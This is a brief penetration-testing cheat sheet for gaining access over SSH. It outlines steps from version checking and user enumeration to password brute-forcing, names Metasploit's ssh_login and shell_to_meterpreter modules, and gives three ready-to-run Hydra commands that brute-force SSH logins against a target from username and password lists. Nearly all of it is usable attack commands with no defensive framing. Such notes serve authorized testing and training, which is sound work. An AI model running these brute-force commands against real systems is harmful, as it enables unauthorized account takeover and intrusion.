1) Check version and vulnerability
2) Enum users
3) Get password from another port or brute force it
4) If you have key connect with key

 use auxiliary/scanner/ssh/ssh_login
 use post/multi/manage/shell_to_meterpreter

Hydra SSH using list of users and passwords

`hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh`

Hydra SSH using a known password and a username list

`hydra -v -V -u -L users.txt -p "<known password>" -t 1 -u $ip ssh`

Hydra SSH Against Known username on port 22

`hydra $ip -s 22 ssh -l <user> -P big_wordlist.txt`
